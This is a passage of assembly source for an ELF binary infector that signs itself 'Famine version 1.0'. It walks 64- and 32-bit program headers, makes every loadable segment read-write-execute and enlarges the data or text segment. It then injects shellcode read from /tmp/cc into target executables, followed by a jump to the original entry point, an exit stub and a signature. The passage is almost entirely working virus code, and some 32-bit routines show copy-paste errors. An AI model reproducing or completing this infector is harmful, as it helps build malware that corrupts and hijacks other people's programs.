		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fets
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_fets
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 32];store p_filesz
		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
		continue_fets:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fets
	loop_fets_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
has_data_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_hds: 
		cmp cx, WORD[rsp]
		jge loop_hds_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_hds
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_hds
		mov rax, 1
		;data_seg found !
		continue_hds:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_hds
	loop_hds_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

get_data_pad:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_gdp: 
		cmp cx, WORD[rsp]
		jge loop_gdp_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_gdp
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_gdp
		mov rax, QWORD[r9 + 40];p_memsz
		sub rax, QWORD[r9 + 32]; - p_filesz
		;data_seg found !
		continue_gdp:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_gdp
	loop_gdp_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

get_text_pad:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_gtp: 
		cmp cx, WORD[rsp]
		jge loop_gtp_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_gtp
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_gtp
		mov rax, QWORD[r9 + 40];p_memsz
		sub rax, QWORD[r9 + 32]; - p_filesz
		;data_seg found !
		continue_gtp:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_gtp
	loop_gtp_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long parse64elfphdr(void *file, int wfd)
parse64elfphdr:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p64ephdr: 
		cmp cx, WORD[rsp]
		jge loop_p64ephdr_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p64ephdr
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		je p64ephdr_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 48; 56-8
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
		jmp continue_p64ephdr		
		p64ephdr_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 24; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		mov rax, QWORD[r9 + 40]
		mov QWORD[rsp + 6], rax; store p_memsz
		add QWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 8
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 8
		lea rsi, [r9 + 48]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub QWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
		;set pad value
		mov rax, QWORD[rsp + 6]; p_memsz
		sub rax, [r9 + 32]; ret = p_memsz - p_filesz

		jmp continue_p64ephdr
		print_p64ephdr: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 56; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p64ephdr:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_p64ephdr
	loop_p64ephdr_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 8
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long parse64elfphdrtext(void *file, int wfd)
parse64elfphdrtext:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p64ephdrt: 
		cmp cx, WORD[rsp]
		jge loop_p64ephdrt_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p64ephdrt
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		je p64ephdrt_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 48; 56-8
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
		jmp continue_p64ephdrt		
		p64ephdrt_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 24; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		mov rax, QWORD[r9 + 40]
		mov QWORD[rsp + 6], rax; store p_memsz
		add QWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 8
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 8
		lea rsi, [r9 + 48]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub QWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
		;set pad value
		mov rax, QWORD[rsp + 6]; p_memsz
		sub rax, [r9 + 32]; ret = p_memsz - p_filesz

		jmp continue_p64ephdrt
		print_p64ephdrt: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 56; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p64ephdrt:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_p64ephdrt
	loop_p64ephdrt_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 8
	pop rdx
	pop rsi
	pop rdi
retn


;void parse64elfsec(void *file, int wfd, unsigned long pad)
parse64elfsec:
	mov r12, rax; copy rax into r12 for jmp calc
	sub rsp, 8; file copy 
	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
	sub rsp, 8;start offset 
	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
	mov QWORD[rsp+16], rdi; save void * file
	; find offset where we will put our shellcode
	cmp rax, 0
	je fets_sect
	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
	jmp fes_done
	fets_sect:
	call find_end_text_seg
	fes_done: 
	mov [rsp + 8], rax
	; first we swap file and wfd for syscalls
	mov rbx, rsi
	mov rsi, rdi
	mov rdi, rbx
	;now we need to calculate the offset to EHDR + PHDR*e_phnum
	xor rbx, rbx
	mov bx, WORD[rsi + 56]; bx == e_phnum
	mov rax, 56; sizeof(Elf64_Phdr)
	mul rbx; rbx * rax -> rax
	add rax, QWORD[rsi + 32]; e_phoff
	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
	lea rsi, [rsi + rax]; file after phdrs
	mov rdx, [rsp + 8]; offset new sect
	sub rdx, [rsp]; rdx == (new_sect - start)
	mov rax, 1
	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
	xor rcx, rcx
	loop_print_pad:
	cmp rcx, r10
	jae loop_print_pad_end
	push rsi
	push rcx
	push 0x00000000
	lea rsi, [rsp]
	mov rdx, 1
	mov rax, 1
	syscall; write(wfd, "\0", 1);
	pop rdx; pop the "\0"
	pop rcx
	pop rsi
	inc rcx
	jmp loop_print_pad
	loop_print_pad_end:
	call write_shellcode
	mov rsi, QWORD[rsp + 16]
	call write_jmp_shellcode
	call write_exit_shellcode; so it doesn't segv when ret is reached in original code
	call write_signature
	mov rsi, QWORD[rsp + 16]
	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
	mov rdx, r9 ; fsize
	sub rdx, QWORD[rsp + 8]; fsize - new_sect
	mov rax, 1
	syscall;write(wfd, file + new_sect, fsize - new_sect);
	mov rax, 3
	syscall; close(wfd)

	add rsp, 8
	add rsp, 8
	add rsp, 8
retn

;void write_shellcode(int wfd)
write_shellcode:
push rdi
	sub rsp, PURE_SHELLCODE_LEN; buffer to read shellcode in
	;OPEN SC FILE
	push rdi
	mov rax, 2
	mov rdi, 0x0063632f706d742f ; "/tmp/cc"
	push rdi
	lea rdi, [rsp]
	xor rsi, rsi
	xor rdx,rdx
	syscall; open("sc", O_RDONLY); 
	pop rbx
	;READ SC FILE
	mov rdi, rax
	mov rax, 0
	lea rsi, [rsp+8]
	mov rdx, PURE_SHELLCODE_LEN
	syscall; read(sc_fd, buffer, SHELLCODE_LEN);
	mov rax, 3
	syscall; close(sc_fd)
	pop rdi
	mov rax, 1
	mov rsi, rsp
	mov rdx, PURE_SHELLCODE_LEN
	syscall;write(wfd, buffer, SHELLCODE_LEN)
	add rsp, PURE_SHELLCODE_LEN
pop rdi
retn

write_jmp_shellcode:
	sub rsp, 4; rel_jmp

	push rsi
	push 0x000000e9
	mov rax, 1
	mov rsi, rsp
	mov rdx, 1
	syscall; write(wfd, "\xe8", 1); op code of call
	pop rax
	pop rsi
	mov rbx, rdi; save rdi
	mov rdi, rsi
	cmp r12, 0; check if data or text infection was used
	je wjs_text
	call find_new_entry
	jmp wjs_done
	wjs_text:
	call find_new_entry_text
	wjs_done: ; rax now contains new_entry
	mov DWORD[rsp], eax
	add DWORD[rsp], SHELLCODE_JMP_INDEX
	mov rax, QWORD[rdi + 24]; old_entry
	sub DWORD[rsp], eax
	neg DWORD[rsp]
	lea rsi, [rsp]
	mov rax, 1
	mov rdx, 4
	mov rdi, rbx
	syscall; write(wfd, &jmp_addr, 4);
	add rsp, 4
retn

write_exit_shellcode:
	mov rax, 0x0000003cb8; mov    eax,0x3c
	push rax
	mov rsi, rsp
	mov rdx, 5
	mov rax, 1
	syscall; write(wfd, 0xb83c000000, 5);
	pop rax

	mov rax, 0x00000013bf; mov    edi,0x0
	push rax
	mov rsi, rsp
	mov rdx, 5
	mov rax, 1
	syscall; write(wfd, 0xbf00000000, 5);	
	pop rax

	push 0x050f ; syscall
	mov rsi, rsp
	mov rdx, 2
	mov rax, 1
	syscall; write(wfd, 0x0f05, 2);
	pop rax
	;all this is eq to c: exit(0);
retn

write_signature:
	mov rax, 0x0000636c656d2d6c
	push rax
	mov rax, 0x6573207962206465
	push rax
	mov rax, 0x646f29632820302e
	push rax
	mov rax, 0x31206e6f69737265
	push rax
	mov rax, 0x7620656e696d6146
	push rax
	mov rsi, rsp
	mov rax, 1
	mov rdx, 39
	syscall; write(wfd, "Famine version 1.0 (c)oded by sel-melc\0", 39)

	add rsp, 40
retn

;	32 BIT PARSING
%define SHELLCODE32_LEN 39

; void parse64elf(void *file, int wfd, unsigned long fsize)
parse32elf:
	sub rsp, 8
	call has_data_seg32
	mov QWORD[rsp], rax
	cmp rax, 0 ;We're gonna get pad to modify e_shoff
	je pad_text32
	call get_data_pad32
	jmp pad_done32
	pad_text32:
	pad_done32:
	mov r10d, eax; contains pad
	mov rax, QWORD[rsp]
	call parse32elfheader
	;PROGRAM HEADERS
	cmp QWORD[rsp], 0
	je text_phdr_parse32
	call parse32elfphdr ; will return pad
	jmp phdr_parse_done32
	text_phdr_parse32:
	call parse32elfphdrtext
	phdr_parse_done32:
	;SECTIONS
	mov r10, rax; pass pad as 3rd param
	mov rax, [rsp]; so we know if we have a data_seg or not 
	call parse32elfsec
	add rsp, 8
retn
; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
has_data_seg32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_hds32: 
		cmp cx, WORD[rsp]
		jge loop_hds_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_hds32
		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_hds32
		mov rax, 1
		;data_seg found !
		continue_hds32:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf32_Phdr)
		jmp loop_hds32
	loop_hds_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn


parse32elfheader:
	push rdi
	push rsi
	push rdx

	sub rsp, 4; new entrypoint stocked here
	cmp rax, 0
	je fne_text32
	fne_data32:
	call find_new_entry32; will put it in rax
	jmp fne_done32
	fne_text32:
	call find_new_entry_text32
	fne_done32:
	;Copy the begining of Elf header till entry
	mov rbx, rdi
	mov rdi, rsi
	mov rsi, rbx
	mov rdx, 28 ; sizeof(Elf64_Ehdr) till entrypoint included
	push rax
	mov rax, 1
	syscall; write(wfd, file, 28);
	;Time to handle the entrypoint
	pop rax
;	mov DWORD[rsp], eax;
	add rsi, 28 ; points right after the entrypoint
	mov rbx, rsi ; store rsi void *file+32
;	mov rsi, rsp
;	mov rdx, 4
;	mov rax, 1
;	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
	;write e_phoff
	mov rdx, 4
	mov rsi, rbx
	mov rax, 1
	syscall; write(wfd, file + 32, 8);
	mov DWORD[rsp], r10d
	add DWORD[rsp], SHELLCODE32_LEN
	mov ebx, DWORD[rsi + 4]; e_shoff
	add DWORD[rsp], ebx
	mov rbx, rsi
	mov rsi, rsp
	mov rax, 1
	syscall;write(wfd, &(e_shoff + SHELLCODE_LEN + pad), 8);
	;Copy the remainder of the elf header
	mov rsi, rbx
	add rsi, 8
	mov rdx, 16
	mov rax, 1
	syscall; write(wfd, file + 48, 16); copying everything after entrypoint


	add rsp, 4

	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long find_new_entry32(void *file)
; will return the offset to begining of our shellcode
find_new_entry32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fne32: 
		cmp cx, WORD[rsp]
		jge loop_fne_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fne32
		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_fne32
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov eax, DWORD[r9 + 20];store p_memsz
		add eax, DWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
		continue_fne32:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_fne32
	loop_fne_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn
; unsigned long find_new_entry_text(void *file)
; will return the offset to begining of our shellcode
find_new_entry_text32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fnet32: 
		cmp cx, WORD[rsp]
		jge loop_fnet_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fnet32
		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_X) means text seg, we're gonna infect it
		jne continue_fnet32
		;we found the text segment !This is where the shellcode will be
		mov eax, DWORD[r9 + 20];store p_memsz
		add eax, DWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
		continue_fnet32:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_fnet32
	loop_fnet_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

get_data_pad32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_gdp32: 
		cmp cx, WORD[rsp]
		jge loop_gdp_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_gdp
		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_gdp
		mov eax, DWORD[r9 + 20];p_memsz
		sub eax, DWORD[r9 + 8]; - p_filesz
		;data_seg found !
		continue_gdp32:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_gdp32
	loop_gdp_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

get_text_pad32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_gtp32: 
		cmp cx, WORD[rsp]
		jge loop_gtp_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_gtp32
		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_gtp32
		mov eax, DWORD[r9 + 20];p_memsz
		sub eax, DWORD[r9 + 8]; - p_filesz
		;data_seg found !
		continue_gtp32:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_gtp32
	loop_gtp_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn


; unsigned long parse32elfphdr(void *file, int wfd)
parse32elfphdr:
	push rdi
	push rsi
	push rdx

	sub rsp, 4; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx 
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p32ephdr: 
		cmp cx, WORD[rsp]
		jge loop_p32ephdr_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p32ephdr
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		je p32ephdr_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 4]
		mov rdx, 20; 32-4 - 8( p_flags & p_align)
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
				;write p_flags
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 4
		lea rsi, [r9 + 28]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		jmp continue_p32ephdr		
		p32ephdr_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 4]
		mov rdx, 12; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		xor rax, rax
		mov eax, DWORD[r9 + 20]
		mov DWORD[rsp + 6], eax; store p_memsz
		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write p_flags
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 4
		lea rsi, [r9 + 28]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
		;set pad value
		xor rax, rax
		mov eax, DWORD[rsp + 6]; p_memsz
		sub eax, [r9 + 16]; ret = p_memsz - p_filesz

		jmp continue_p32ephdr
		print_p32ephdr: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 32; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p32ephdr:
		inc rcx
